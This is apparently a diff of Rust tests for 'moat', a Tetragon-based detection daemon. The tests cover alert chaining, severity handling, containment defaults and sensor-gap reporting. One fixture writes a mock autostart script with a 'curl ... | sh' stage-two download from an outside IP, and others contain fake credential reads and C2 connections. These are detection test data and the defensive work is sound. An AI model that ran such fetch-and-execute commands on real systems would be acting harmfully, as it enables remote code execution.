+            r#"{"process_exec":{"process":{"exec_id":"p1","pid":41233,"uid":1000,
+                 "binary":"/usr/bin/node","arguments":"setup.mjs","cwd":"/home/dan/p",
+                 "start_time":"2026-09-04T10:00:00.000000000Z","parent_exec_id":"p0"},
+                 "parent":{"exec_id":"p0","pid":41230,"binary":"/usr/bin/sh","arguments":"-c x"}},
+                 "time":"2026-09-04T10:00:00.100000000Z"}"#,
+        );
+        d.handle_line(
+            r#"{"process_exit":{"process":{"exec_id":"p1","pid":41233,"binary":"/usr/bin/node"},
+                 "status":0},"time":"2026-09-04T10:00:01.000000000Z"}"#,
+        );
+        d.flush_telemetry();
+        let recs = telemetry_lines(&d);
+        assert_eq!(recs.len(), 2);
+        assert_eq!(recs[0]["kind"], "exec");
+        assert_eq!(recs[0]["parent_exec_id"], "p0");
+        assert!(recs[0].get("parent").is_none(), "the join halves the bytes");
+        assert_eq!(recs[1]["kind"], "exit");
+        assert_eq!(recs[1]["exec_id"], "p1");
+        assert_eq!(d.telemetry_written, 2);
+    }
+
+    /// Design 2b/3a end to end, through the real event path.
+    ///
+    /// The shipped sample log is one `npm install` whose postinstall script
+    /// reads an SSH key and a cloud credential, opens a reverse shell, talks to
+    /// a host outside the registry allowlist, and ends up in ptrace and setuid.
+    /// Before this stage those were eight separate alerts a person had to
+    /// assemble in their head. They are one story under one process.
+    #[test]
+    fn the_sample_installs_alerts_correlate_into_one_chain() {
+        let dir = tempfile::tempdir().unwrap();
+        let (mut d, _) = dev_daemon(dir.path());
+        let text = std::fs::read_to_string(&d.cfg.paths.tetragon_log).unwrap();
+        for line in text.lines() {
+            d.handle_line(line);
+        }
+        let alerts = d.store.load();
+        let chained: Vec<&Alert> = alerts.iter().filter(|a| a.chain.is_some()).collect();
+        assert!(chained.len() >= 4, "expected one chain across the install, got {}", chained.len());
+
+        // Every member carries the same chain, so a reader that opened any one
+        // of them can draw the whole story without a second lookup.
+        let c = chained[0].chain.clone().unwrap();
+        for a in &chained {
+            assert_eq!(a.chain.as_ref().unwrap().id, c.id, "{} is in a different chain", a.id);
+        }
+
+        // The subject is the install, not whichever process happened to trip
+        // the last rule.
+        assert_eq!(c.ancestor.exe, "/usr/bin/npm");
+        assert!(c.families.contains(&"cred".to_string()));
+        assert!(c.families.contains(&"net".to_string()));
+
+        // Higher than any member is the whole point, and it is written down.
+        assert_eq!(c.severity, "critical");
+        assert!(
+            c.severity_reason.contains("credential") || c.severity_reason.starts_with("stays"),
+            "escalation must justify itself: {}",
+            c.severity_reason
+        );
+        assert!(c.summary.contains("under npm"), "{}", c.summary);
+
+        // Steps are in time order, and each one names an alert that exists.
+        let ids: std::collections::HashSet<&str> = alerts.iter().map(|a| a.id.as_str()).collect();
+        let mut prev = String::new();
+        for s in &c.steps {
+            assert!(ids.contains(s.alert.as_str()), "step names a missing alert {}", s.alert);
+            assert!(s.alert > prev, "steps out of order at {}", s.alert);
+            prev = s.alert.clone();
+        }
+
+        // A member's own severity is never rewritten by the chain: it is still
+        // the right answer about the single event it describes.
+        let low = alerts.iter().find(|a| a.rule == "moat-pkg-subtree-interpreter-spawn").unwrap();
+        assert_eq!(low.severity, "low", "the chain must not rewrite member severities");
+        assert_eq!(low.chain.as_ref().unwrap().severity, "critical");
+
+        // And the daemon reports it.
+        let st = d.status();
+        assert_eq!(st["chains_formed"], 1);
+        assert_eq!(st["chains_open"], 1);
+    }
+
+    /// Regression for the 2026-09-04 20:41 miss, driven through `emit` because
+    /// the fault was in `note_chain`'s mapping and not in the correlator: a
+    /// `chain.rs` unit test passed throughout.
+    ///
+    /// A simulated npm C2 package rewrote `.git/config` (persist, high,
+    /// first_seen) and read a project token (cred, medium, rare) from one pid
+    /// one second apart. Nothing correlated. `note_chain` was passing
+    /// `silenced: alert.surface != "alerts"`, and `scoring::surface_for` routes
+    /// on severity alone — so every medium and low was quietly a context step
+    /// and the documented "at least one member at medium or worse" had become
+    /// "at least two members at high or worse".
+    #[test]
+    fn a_medium_alert_is_a_chain_trigger_not_context() {
+        let dir = tempfile::tempdir().unwrap();
+        let (mut d, _) = dev_daemon(dir.path());
+        // One `node` under a bash whose own parent the daemon never saw: the
+        // one-element ancestry of the real records.
+        // Neither path may exist: a `high` alert takes an incident snapshot,
+        // which opens and hashes both the exe and the file it names. See
+        // `no_test_fixture_names_a_path_that_exists_on_this_machine`.
+        let lab = "/tmp/moat-chain-regression-no-such-lab";
+        let proc = |exec_id: &str, pid: u32, exe: &str| ProcInfo {
+            exec_id: exec_id.into(),
+            pid,
+            uid: 1000,
+            exe: exe.into(),
+            args: String::new(),
+            cwd: lab.into(),
+            start_time: util::now_rfc3339(),
+            parent_exec_id: None,
+            exited_at: None,
+            exit_signal: None,
+            exe_note: None,
+            sid: None,
+        };
+        let node = proc("e-node", 1_876_167, "/home/dan/.no-such-mise/node/26.5.0/bin/node");
+        let bash = proc("e-bash", 581_833, "/usr/bin/bash");
+
+        let finding = |rule: &str, family: &str, severity: &str, path: String| {
+            let mut f = Finding::new(rule, crate::policy::PolicyMeta::fallback(rule), node.clone());
+            f.meta.family = family.into();
+            f.meta.severity = severity.into();
+            f.hook = "file_post_open".into();
+            f.hook_detail = Some("write".into());
+            f.ancestry = vec![bash.clone()];
+            f.file = Some(crate::alert::FileRef { path, sha256: None });
+            f
+        };
+
+        let a = d
+            .emit(finding(
+                "moat-persist-git-config-write",
+                "persist",
+                "high",
+                format!("{}/.git/config", lab),
+            ))
+            .expect("the persist write must raise an alert");
+        let b = d
+            .emit(finding(
+                "moat-cred-project-token-read",
+                "cred",
+                "medium",
+                format!("{}/.env", lab),
+            ))
+            .expect("the token read must raise an alert");
+
+        let alerts = d.store.load();
+        let by_id = |id: &str| alerts.iter().find(|x| x.id == id).unwrap().clone();
+        let (pa, ca) = (by_id(&a), by_id(&b));
+
+        // The shape the live daemon actually recorded, so this test fails if
+        // the routing that caused the bug ever changes meaning.
+        assert_eq!(pa.severity, "high");
+        assert_eq!(pa.surface, "alerts");
+        assert_eq!(ca.severity, "medium");
+        // `surface_for` routed this medium to the timeline, and then the chain
+        // reached `high` and restamped its trigger members. That is the whole
+        // point: a correlated sequence has to be able to reach the badge even
+        // when each half is unremarkable on its own.
+        assert_eq!(ca.surface, "alerts", "a high chain raises its trigger members");
+        assert!(ca.suppressed_by.is_none(), "nobody allowlisted this");
+
+        // Both alerts carry the sequence, and both count as triggers.
+        let chain = pa.chain.clone().expect("the two alerts must correlate");
+        assert_eq!(ca.chain.as_ref().map(|c| c.id.as_str()), Some(chain.id.as_str()));
+        assert_eq!(chain.steps.len(), 2);
+        assert!(
+            chain.steps.iter().all(|s| s.is_trigger()),
+            "a timeline alert is weak, not allowed: {:?}",
+            chain.steps.iter().map(|s| s.role.clone()).collect::<Vec<_>>()
+        );
+        assert_eq!(chain.families, vec!["persist", "cred"]);
+        assert_eq!(chain.ancestor.pid, 1_876_167);
+        assert_eq!(d.status()["chains_formed"], 1);
+
+        // The member's own SEVERITY is untouched: the chain is the escalation,
+        // and `medium` is still the right answer about one read. What the chain
+        // does change is where the member is shown -- a sequence worth
+        // interrupting for cannot be one nobody is shown.
+        assert_eq!(by_id(&b).severity, "medium");
+        assert_eq!(by_id(&b).surface, "alerts");
+        assert!(by_id(&b).suppressed_by.is_none());
+    }
+
+    /// A high chain reads the files it implicated, and the findings land where
+    /// they help — without moving a single severity.
+    ///
+    /// The trigger is deliberately narrow: this is the ONLY path in the daemon
+    /// that opens a file to look at its contents. If a future change makes
+    /// something scan on write, on exec or on a timer, that is an anti-virus,
+    /// and it was explicitly rejected for this product.
+    #[test]
+    fn a_high_chain_reads_what_it_implicated_and_changes_no_severity() {
+        let dir = tempfile::tempdir().unwrap();
+        let (mut d, _) = dev_daemon(dir.path());
+        let lab = dir.path().join("lab");
+        std::fs::create_dir_all(lab.join(".config/autostart")).unwrap();
+
+        // The dropper: a real ELF, so the parser is exercised on something a
+        // linker produced rather than on a fixture.
+        let dropper = lab.join(".fontconfig-helper");
+        std::fs::copy("/bin/sh", &dropper).unwrap();
+        // The persistence artefact: a script carrying the vocabulary.
+        let unit = lab.join(".config/autostart/update.desktop");
+        std::fs::write(
+            &unit,
+            b"#!/bin/sh\n# updater\ncurl -sL http://45.9.148.99/stage2 | sh\neval(atob('cm0='))\n",
+        )
+        .unwrap();
+        // The credential the same tree read. It must never be opened.
+        let secret = lab.join(".env");
+        std::fs::write(&secret, b"AWS_SECRET_ACCESS_KEY=hunter2\n").unwrap();
+
+        let proc = |exec_id: &str, pid: u32, exe: &str| ProcInfo {
+            exec_id: exec_id.into(),
+            pid,
+            uid: 1000,
+            exe: exe.into(),
+            args: String::new(),
+            cwd: lab.display().to_string(),
+            start_time: util::now_rfc3339(),
+            parent_exec_id: None,
+            exited_at: None,
+            exit_signal: None,
+            exe_note: None,
+            sid: None,
+        };
+        let actor = proc("e-drop", 4242, &dropper.display().to_string());
+        let parent = proc("e-bash", 4241, "/usr/bin/bash");
+        let finding = |rule: &str, family: &str, severity: &str, path: String| {
+            let mut f = Finding::new(rule, crate::policy::PolicyMeta::fallback(rule), actor.clone());
+            f.meta.family = family.into();
+            f.meta.severity = severity.into();
+            f.hook = "file_post_open".into();
+            f.hook_detail = Some("write".into());
+            f.ancestry = vec![parent.clone()];
+            f.file = Some(crate::alert::FileRef { path, sha256: None });
+            f
+        };
+
+        let persist = d
+            .emit(finding(
+                "moat-persist-autostart-write",
+                "persist",
+                "high",
+                unit.display().to_string(),
+            ))
+            .unwrap();
+        let cred = d
+            .emit(finding(
+                "moat-cred-project-token-read",
+                "cred",
+                "medium",
+                secret.display().to_string(),
+            ))
+            .unwrap();
+
+        let alerts = d.store.load();
+        let by_id = |id: &str| alerts.iter().find(|x| x.id == id).unwrap().clone();
+        let pa = by_id(&persist);
+        assert!(pa.chain.is_some(), "the two alerts must correlate first");
+
+        // --- the actor: a real ELF, read the way ldd and nm read it.
+        let elf = pa
+            .content
+            .iter()
+            .find(|c| c.role == "actor")
+            .expect("the binary that acted was analysed");
+        assert_eq!(elf.kind, "elf", "type comes from magic bytes");
+        assert_eq!(elf.sha256.len(), 64);
+        let e = elf.elf.as_ref().expect("ELF details");
+        assert_eq!(e.linkage, "dynamic");
+        assert!(e.needed.iter().any(|n| n.starts_with("libc.so")), "{:?}", e.needed);
+        assert!(e.sections.iter().any(|s| s.name == ".text"));
+
+        // --- the target: the vocabulary, the C2 address, and its range.
+        let script = pa
+            .content
+            .iter()
+            .find(|c| c.role == "target")
+            .expect("the file it touched was analysed");
+        assert_eq!(script.kind, "script");
+        assert_eq!(script.script.as_ref().unwrap().interpreter, "/bin/sh");
+        let names: Vec<&str> = script.markers.iter().map(|m| m.name.as_str()).collect();
+        assert!(names.contains(&"exec:curl-pipe-shell"), "{:?}", names);
+        assert!(
+            script.hosts.iter().any(|h| h.value == "45.9.148.99" && h.scope == "public"),
+            "{:?}",
+            script.hosts
+        );
+
+        // --- the credential is named and never opened. `is_secret_path` is the
+        // authority, and it holds on this path even though the rule that
+        // matched it is in the family whose target IS the secret.
+        let ca = by_id(&cred);
+        let refused = ca
+            .content
+            .iter()
+            .find(|c| c.role == "target")
+            .expect("the credential is still listed");
+        assert!(
+            refused.skipped.as_deref().unwrap_or("").contains("credential"),
+            "{:?}",
+            refused.skipped
+        );
+        assert!(refused.sha256.is_empty(), "a refused file is not even hashed");
+        assert!(refused.strings.is_empty());
+
+        // --- findings are evidence. They are on the alert's evidence list, and
+        // in the bundle, and they moved nothing.
+        assert_eq!(pa.severity, "high", "content analysis must not move a severity");
+        assert_eq!(ca.severity, "medium");
+        assert_eq!(pa.severity_base, by_id(&persist).severity_base);
+        assert!(
+            pa.explain.evidence.iter().any(|l| l.contains("45.9.148.99 [public]")),
+            "{:?}",
+            pa.explain.evidence
+        );
+        let md = d.write_bundle(&persist).unwrap();
+        let body = std::fs::read_to_string(&md).unwrap();
+        assert!(body.contains("## What is inside those files"));
+        assert!(body.contains("45.9.148.99"));
+
+        // --- and the budget is spent, counted, and visible.
+        assert!(d.status()["content"]["used"].as_u64().unwrap() >= 2);
+    }
+
+    /// What must be pushed back into the kernel after a restart.
+    ///
+    /// `tetra tp set-mode` changes a live policy and that change dies with the
+    /// sensor. Restoring the armed set into memory only -- which is what the
+    /// daemon did until 2026-09-04 -- meant that after any tetragon restart the
+    /// rules reverted to `monitor` in the kernel while `status` and the panel
+    /// still said ARMED. Believing a rule is enforcing when it is not is worse
+    /// than knowing it is off.
+    #[test]
+    fn the_armed_set_is_pushed_back_into_the_kernel_after_a_restart() {
+        let dir = tempfile::tempdir().unwrap();
+        let (mut d, _) = dev_daemon(dir.path());
+        assert!(
+            d.enforcement_to_apply().is_empty(),
+            "a monitor daemon with nothing armed asks the kernel for nothing"
+        );
+
+        let rule = d.policies.names().first().cloned().expect("testdata policies");
+        d.enforcing_rules.insert(rule.clone());
+        assert_eq!(
+            d.enforcement_to_apply(),
+            vec![rule.clone()],
+            "one armed rule is one policy to re-arm, not all of them"
+        );
+
+        // Daemon-wide enforce means every policy, not just the named ones.
+        d.mode = "enforce".into();
+        assert_eq!(d.enforcement_to_apply().len(), d.policies.names().len());
+    }
+
+    /// The kill decision must not act until it is asked to, and must not act
+    /// twice on one chain.
+    ///
+    /// A design review on 2026-09-05 ran the first version of these rules
+    /// against this machine's own records: they would have killed the user's
+    /// build four times that day, thirteen processes at a time. `log` is the
+    /// default because rules for an action with no undo have to be judged
+    /// against real traffic before they are allowed to act.
+    #[test]
+    fn killing_is_off_until_asked_and_decided_once_per_chain() {
+        assert_eq!(Config::default().contain.kill, "log", "never `kill` by default");
+        assert!(
+            !Config::default().contain.enabled,
+            "and containment itself is off too"
+        );
+
+        let dir = tempfile::tempdir().unwrap();
+        let (mut d, _) = dev_daemon(dir.path());
+        d.cfg.contain.kill = "off".into();
+
+        // In `off` no chain is ever considered, so nothing is recorded about it.
+        let c = crate::chain::Chain {
+            v: 1,
+            id: "01CHAIN".into(),
+            ancestor: crate::alert::Ancestor { pid: 5000, exe: "/usr/bin/makepkg".into() },
+            families: vec!["exec".into(), "net".into()],
+            severity: "high".into(),
+            severity_base: "high".into(),
+            severity_reason: "r".into(),
+            first_ts: util::now_rfc3339(),
+            last_ts: util::now_rfc3339(),
+            span_secs: 1,
+            steps: vec![],
+            steps_total: 0,
+            truncated: false,
+            members: Vec::new(),
+            summary: "s".into(),
+        };
+        d.maybe_kill_tree(&c, util::unix_secs());
+        assert!(d.killed_chains.is_empty());
+
+        // In `log` a chain with no usable targets is still not recorded, so a
+        // later growth of the same chain can still be judged.
+        d.cfg.contain.kill = "log".into();
+        d.maybe_kill_tree(&c, util::unix_secs());
+        assert!(d.killed_chains.is_empty(), "nothing to decide is not a decision");
+    }
+
+    /// Containment is the only thing moat does on its own judgement rather than
+    /// on a rule the user armed, so it stays off until it is asked for --
+    /// including when rules ARE armed and the daemon is enforcing.
+    #[test]
+    fn containment_never_happens_unless_it_was_turned_on() {
+        assert!(
+            !Config::default().contain.enabled,
+            "the default must be off; a security default that surprises is a bug"
+        );
+
+        let dir = tempfile::tempdir().unwrap();
+        let (mut d, _) = dev_daemon(dir.path());
+        d.mode = "enforce".into();
+        d.cfg.thresholds.dedupe_secs = 0;
+        // A tetra that would fail loudly if it were ever run.
+        d.cfg.paths.tetra = dir.path().join("no-such-tetra");
+        let proc = |exec_id: &str, pid: u32, exe: &str| ProcInfo {
+            exec_id: exec_id.into(),
+            pid,
+            uid: 1000,
+            exe: exe.into(),
+            args: String::new(),
+            cwd: "/tmp/moat-contain-no-such-lab".into(),
+            start_time: util::now_rfc3339(),
+            parent_exec_id: None,
+            exited_at: None,
+            exit_signal: None,
+            exe_note: None,
+            sid: None,
+        };
+        let actor = proc("e-imp", 7100, "/tmp/no-such-lab/implant");
+        let root = proc("e-mk", 7000, "/usr/bin/no-such-makepkg");
+        let mut mk = |rule: &str, family: &str, sev: &str, ip: Option<&str>| {
+            let mut f = Finding::new(rule, crate::policy::PolicyMeta::fallback(rule), actor.clone());
+            f.meta.family = family.into();
+            f.meta.severity = sev.into();
+            f.ancestry = vec![root.clone()];
+            if let Some(ip) = ip {
+                f.net = Some(crate::alert::NetRef {
+                    dst_ip: ip.into(),
+                    dst_port: 4873,
+                    domain: None,
+                });
+            } else {
+                f.hook = "file_post_open".into();
+                f.file = Some(crate::alert::FileRef {
+                    path: "/tmp/no-such-lab/dropped".into(),
+                    sha256: None,
+                });
+            }
+            d.emit(f)
+        };
+        mk("moat-persist-git-config-write", "persist", "high", None);
+        mk("moat-x-pkg-egress", "net", "medium", Some("192.168.44.122"));
+
+        assert!(
+            d.contain.live().is_empty(),
+            "a high chain must not contain anything while containment is off"
+        );
+    }
+
+    /// Enforcement that refuses instead of killing.
+    ///
+    /// Every armed rule was `Sigkill` until 2026-09-04, because the network
+    /// rules hung off the `tcp_connect` kprobe and that function cannot be
+    /// error-injected -- so the only enforcement available was ending the
+    /// process. On a developer's machine that is a bad trade: to stop one
+    /// connection you take out a build, an editor or a shell, and lose the
+    /// process tree you wanted to look at. `security_socket_connect` is a real
+    /// LSM hook, so the connect can be refused with -EPERM instead.
+    ///
+    /// A refusal is recorded the moment it is seen. A kill is not -- it waits
+    /// for process_exit to report SIGKILL -- because a kill that did not land
+    /// must never be shown as one.
+    #[test]
+    fn a_refused_operation_is_recorded_without_waiting_for_a_death() {
+        let dir = tempfile::tempdir().unwrap();
+        let (mut d, _) = dev_daemon(dir.path());
+        // Armed: a refusal is only a refusal where the kernel policy was
+        // enforcing. This test used to pass in monitor mode, which is to say
+        // it pinned the bug -- see the test below for the monitor half.
+        d.enforcing_rules.insert("moat-net-tmpfs-binary-egress".into());
+        d.handle_line(&exec_line("e-imp", 6100, "/tmp/dropped/implant", "", ""));
+        let line = r#"{"process_kprobe":{"process":{"exec_id":"e-imp","pid":6100,"uid":1000,"binary":"/tmp/dropped/implant","cwd":"/tmp","start_time":"2026-09-04T23:00:00.000000000Z"},"function_name":"socket_connect","policy_name":"moat-net-tmpfs-binary-egress","action":"KPROBE_ACTION_OVERRIDE","args":[{"sock_arg":{"family":"AF_INET","daddr":"185.220.101.55","dport":443,"saddr":"192.168.1.20","sport":51234}}]},"time":"2026-09-04T23:00:00.100Z"}"#;
+        d.handle_line(line);
+
+        // Not `.pop()`: the same connect also feeds `moat-net-first-contact`,
+        // which is the point of that rule.
+        let alerts = d.store.load();
+        let a = alerts
+            .iter()
+            .find(|x| x.rule == "moat-net-tmpfs-binary-egress")
+            .expect("the refusal must be recorded");
+        assert_eq!(
+            a.action_taken, "blocked",
+            "the kernel already refused it; nothing has to confirm that"
+        );
+        assert!(
+            a.explain.evidence.iter().any(|e| e.contains("EPERM")),
+            "the user is told the program is still running and saw the call fail: {:?}",
+            a.explain.evidence
+        );
+    }
+
+    /// The inverse of the test above, and the half that was missing: the same
+    /// event under a monitor-mode policy is NOT a refusal. Tetragon reports the
+    /// configured action either way; "blocked" beside "mode: monitor" was a
+    /// record contradicting itself about whether a connection went out.
+    #[test]
+    fn a_configured_refusal_in_monitor_mode_is_not_recorded_as_one() {
+        let dir = tempfile::tempdir().unwrap();
+        let (mut d, _) = dev_daemon(dir.path());
+        assert_eq!(d.mode_for("moat-net-tmpfs-binary-egress"), "monitor", "precondition");
+        d.handle_line(&exec_line("e-imp", 6100, "/tmp/dropped/implant", "", ""));
+        let line = r#"{"process_kprobe":{"process":{"exec_id":"e-imp","pid":6100,"uid":1000,"binary":"/tmp/dropped/implant","cwd":"/tmp","start_time":"2026-09-04T23:00:00.000000000Z"},"function_name":"socket_connect","policy_name":"moat-net-tmpfs-binary-egress","action":"KPROBE_ACTION_OVERRIDE","args":[{"sock_arg":{"family":"AF_INET","daddr":"185.220.101.55","dport":443,"saddr":"192.168.1.20","sport":51234}}]},"time":"2026-09-04T23:00:00.100Z"}"#;
+        d.handle_line(line);
+        let alerts = d.store.load();
+        let a = alerts
+            .iter()
+            .find(|x| x.rule == "moat-net-tmpfs-binary-egress")
+            .expect("the event is still an alert");
+        assert_eq!(a.mode, "monitor");
+        assert_eq!(a.action_taken, "none", "nothing was refused in monitor mode");
+        assert!(
+            !a.explain.evidence.iter().any(|e| e.contains("EPERM")),
+            "and the user is not told it was: {:?}",
+            a.explain.evidence
+        );
+        assert!(a.explain.evidence.iter().any(|e| e.contains("monitor mode")));
+
+        // Armed for that one rule, the same event is a refusal, and the
+        // record says so consistently.
+        d.enforcing_rules.insert("moat-net-tmpfs-binary-egress".into());
+        d.cfg.thresholds.dedupe_secs = 0;
+        d.handle_line(&line.replace("23:00:00.100Z", "23:00:05.100Z"));
+        let b = d
+            .store
+            .load()
+            .into_iter()
+            .filter(|x| x.rule == "moat-net-tmpfs-binary-egress")
+            .last()
+            .unwrap();
+        assert_eq!(b.mode, "enforce");
+        assert_eq!(b.action_taken, "blocked");
+    }
+
+    /// One place stamps the mode an alert was raised under, and everything
+    /// written about that alert agrees with it: the record, its evidence line,
+    /// the incident snapshot's meta.json and the analysis bundle.
+    #[test]
+    fn everything_written_about_an_alert_agrees_on_its_mode() {
+        let dir = tempfile::tempdir().unwrap();
+        let (mut d, _) = dev_daemon(dir.path());
+        // Armed on its own: the daemon stays in monitor.
+        d.enforcing_rules.insert("moat-net-first-contact".into());
+        assert_eq!(d.mode, "monitor");
+
+        // A userland-rule finding, built the way `RuleCtx::finding` builds one:
+        // with the DAEMON's mode on it.
+        let proc = ProcInfo {
+            exec_id: "e-cli".into(),
+            pid: 7300,
+            uid: 1000,
+            exe: "/tmp/no-such-lab/cli".into(),
+            args: String::new(),
+            cwd: "/tmp/no-such-lab".into(),
+            start_time: util::now_rfc3339(),
+            parent_exec_id: None,
+            exited_at: None,
+            exit_signal: None,
+            exe_note: None,
+            sid: None,
+        };
+        let mut f = Finding::new(
+            "moat-net-first-contact",
+            crate::policy::PolicyMeta::fallback("moat-net-first-contact"),
+            proc,
+        );
+        f.meta.severity = "high".into();
+        f.hook = "userland".into();
+        f.mode = d.mode.clone();
+        f.net = Some(crate::alert::NetRef {
+            dst_ip: "203.0.113.9".into(),
+            dst_port: 443,
+            domain: None,
+        });
+        let id = d.emit(f).expect("recorded");
+        let a = d.store.find(&id).unwrap();
+        assert_eq!(a.mode, "enforce", "the record carries the mode that governed the rule");
+        assert_eq!(a.mode, d.mode_for(&a.rule));
+
+        let bundle = d.write_bundle(&id).expect("bundle");
+        let body = std::fs::read_to_string(&bundle).unwrap();
+        assert!(
+            body.contains("| mode | enforce |"),
+            "the bundle's table is about the alert, so its mode row is the alert's: {}",
+            body.lines().find(|l| l.starts_with("| mode")).unwrap_or("")
+        );
+    }
+
+    /// Under a daemon-wide enforce every armable rule kills, and the Rules tab
+    /// must say so: `armed` is what the kernel does for the rule, not whether
+    /// the rule happens to be on the per-rule list.
+    #[test]
+    fn every_armable_rule_reads_armed_under_a_daemon_wide_enforce() {
+        let dir = tempfile::tempdir().unwrap();
+        let (mut d, _) = dev_daemon(dir.path());
+        assert!(d.enforceable().iter().all(|r| r["armed"] == false), "monitor: nothing armed");
+        d.mode = "enforce".into();
+        assert!(d.enforcing_rules.is_empty(), "a global switch lists no rule");
+        let rows = d.enforceable();
+        assert!(!rows.is_empty());
+        for r in &rows {
+            let rule = r["rule"].as_str().unwrap();
+            assert_eq!(r["armed"], true, "{} kills under mode enforce", rule);
+            assert_eq!(r["armed"] == true, d.mode_for(rule) == "enforce");
+        }
+    }
+
+    /// A hole in the record is itself a finding.
+    ///
+    /// Stopping the daemon needs root, and `Restart=always` brings it straight
+    /// back -- so a root-level shutdown used to leave nothing behind at all:
+    /// the process returns, the log resumes, and the minutes in between simply
+    /// are not there. Anyone who wants to work unobserved stops the sensor
+    /// first, so the gap has to be said out loud.
+    #[test]
+    fn a_gap_in_the_record_is_reported_on_the_next_start() {
+        let dir = tempfile::tempdir().unwrap();
+        let (mut d, _) = dev_daemon(dir.path());
+
+        // Never run before: no record, so no hole to report.
+        d.last_heartbeat = 0;
+        let n = d.store.load().len();
+        d.report_downtime();
+        assert_eq!(d.store.load().len(), n, "a first start is not an outage");
+
+        // A restart takes seconds; that is not a hole either.
+        d.last_heartbeat = d.started.saturating_sub(5);
+        d.report_downtime();
+        assert_eq!(d.store.load().len(), n, "an ordinary restart is not an outage");
+
+        // Twenty minutes is.
+        d.last_heartbeat = d.started.saturating_sub(1200);
+        d.report_downtime();
+        let a = d
+            .store
+            .load()
+            .into_iter()
+            .find(|a| a.rule == "moat-x-was-not-running")
+            .expect("the outage must be recorded");
+        assert_eq!(a.severity, "high");
+        assert!(
+            a.explain.evidence.iter().any(|e| e.contains("1200 second hole")),
+            "the record says how long: {:?}",
+            a.explain.evidence
+        );
+    }
+
+    /// Killing the panel must not be a silent way to switch Moat off.
+    ///
+    /// Every notification comes from a program in the user's own session, so
+    /// anything running as the user can end them with one `pkill` -- no
+    /// evasion, no privilege -- while moatd keeps recording faithfully and
+    /// nobody ever sees it. moatd is root and cannot be stopped that way, so
+    /// the noticing lives here.
+    #[test]
+    fn moat_notices_when_nothing_is_reading_its_alerts() {
+        let dir = tempfile::tempdir().unwrap();
+        let (mut d, _) = dev_daemon(dir.path());
+        let now = util::unix_secs();
+
+        // A surfaced alert nobody has answered.
+        let proc = ProcInfo {
+            exec_id: "e-x".into(),
+            pid: 4242,
+            uid: 1000,
+            exe: "/tmp/moat-watchdog-no-such-lab/dropper".into(),
+            args: String::new(),
+            cwd: "/tmp".into(),
+            start_time: util::now_rfc3339(),
+            parent_exec_id: None,
+            exited_at: None,
+            exit_signal: None,
+            exe_note: None,
+            sid: None,
+        };
+        let mut f = Finding::new(
+            "moat-persist-git-config-write",
+            crate::policy::PolicyMeta::fallback("moat-persist-git-config-write"),
+            proc,
+        );
+        f.meta.family = "persist".into();
+        f.meta.severity = "high".into();
+        f.hook = "file_post_open".into();
+        f.file = Some(crate::alert::FileRef {
+            path: "/tmp/moat-watchdog-no-such-lab/.git/config".into(),
+            sha256: None,
+        });
+        d.emit(f).expect("the alert must be recorded");
+        assert!(
+            d.store.load().iter().any(|a| !a.acked && a.surface == "alerts"),
+            "precondition: something is waiting for a human"
+        );
+
+        // Somebody is watching: nothing to say.
+        d.note_watcher(now);
+        let n = d.store.load().len();
+        d.watchdog_tick(now + 60);
+        assert_eq!(d.store.load().len(), n, "a panel that is polling is not a gap");
+
+        // Half an hour of silence with an alert waiting is.
+        d.watchdog_tick(now + 3600);
+        let a = d
+            .store
+            .load()
+            .into_iter()
+            .find(|a| a.rule == "moat-x-nobody-is-watching")
+            .expect("the gap must be recorded");
+        assert_eq!(a.severity, "high");
+
+        // Said once, not every tick: this repeats for as long as the panel is
+        // gone, and burying the queue would be the same failure again.
+        let n = d.store.load().len();
+        d.watchdog_tick(now + 3700);
+        assert_eq!(d.store.load().len(), n);
+    }
+
+    /// A dropped-events message is an alert, not a shrug.
+    ///
+    /// `cgroup-rate` is 1000 events/s and serde ignores unknown fields, so
+    /// `process_throttle` parsed into nothing. An attacker exceeding that rate
+    /// gets the sensor to discard their own events -- the one evasion where the
+    /// evidence is what goes missing, so the throttle itself has to be said out
+    /// loud.
+    #[test]
+    fn the_sensor_dropping_events_is_itself_an_alert() {
+        let dir = tempfile::tempdir().unwrap();
+        let (mut d, _) = dev_daemon(dir.path());
+        let line = r#"{"process_throttle":{"type":"THROTTLE_START","cgroup":"/user.slice/app-noise.scope"},"time":"2026-09-05T10:00:00.000Z"}"#;
+        d.handle_line(line);
+
+        let a = d
+            .store
+            .load()
+            .into_iter()
+            .find(|a| a.rule == "moat-x-sensor-throttled")
+            .expect("a throttle must be recorded");
+        assert_eq!(a.severity, "high");
+        assert!(a.explain.evidence.iter().any(|e| e.contains("app-noise.scope")));
+
+        // Rate limited: a flood throttles continuously and one alert per
+        // dropped batch would bury the thing it is warning about.
+        let n = d.store.load().len();
+        d.handle_line(line);
+        d.handle_line(line);
+        assert_eq!(d.store.load().len(), n, "one an hour per cgroup, not one per message");
+
+        // THROTTLE_STOP is the recovery, not a new hole.
+        d.handle_line(r#"{"process_throttle":{"type":"THROTTLE_STOP","cgroup":"/other"},"time":"2026-09-05T10:00:00.000Z"}"#);
+        assert_eq!(d.store.load().len(), n);
+    }
+
+    /// The 2026-09-04 AUR miss, pinned.
+    ///
+    /// `makepkg` egressed to a host outside the registry and ran a dropped
+    /// binary out of /tmp. The /tmp exec was `high` and `first_seen` -- the
+    /// strongest signal in the run -- but its rule was demoted rule-wide,
+    /// because the developer's own `cargo test` trips the same rule all day.
+    /// A demotion used to make a step context-only, so the chain was left with
+    /// `low`/`medium` triggers, came out `medium`, and nothing reached the
+    /// badge. The user ran a full attack and saw no alerts at all.
+    ///
+    /// Frequency is not consent. Only the user's allowlist silences a step.
+    #[test]
+    fn a_noise_demoted_alert_is_still_a_chain_trigger() {
+        let dir = tempfile::tempdir().unwrap();
+        let (mut d, _) = dev_daemon(dir.path());
+        d.cfg.thresholds.dedupe_secs = 0;
+        // No path here may exist: a `high` alert takes an incident snapshot,
+        // which opens and hashes the exe and the file it names.
+        let proc = |exec_id: &str, pid: u32, exe: &str| ProcInfo {
+            exec_id: exec_id.into(),
+            pid,
+            uid: 1000,
+            exe: exe.into(),
+            args: String::new(),
+            cwd: "/tmp/moat-aur-regression-no-such-lab".into(),
+            start_time: util::now_rfc3339(),
+            parent_exec_id: None,
+            exited_at: None,
+            exit_signal: None,
+            exe_note: None,
+            sid: None,
+        };
+        let actor = proc("e-py", 2_257_600, "/usr/bin/no-such-python");
+        let makepkg = proc("e-mk", 2_257_581, "/usr/bin/no-such-makepkg");
+        let finding = |rule: &str, family: &str, severity: &str, path: String| {
+            let mut f = Finding::new(rule, crate::policy::PolicyMeta::fallback(rule), actor.clone());
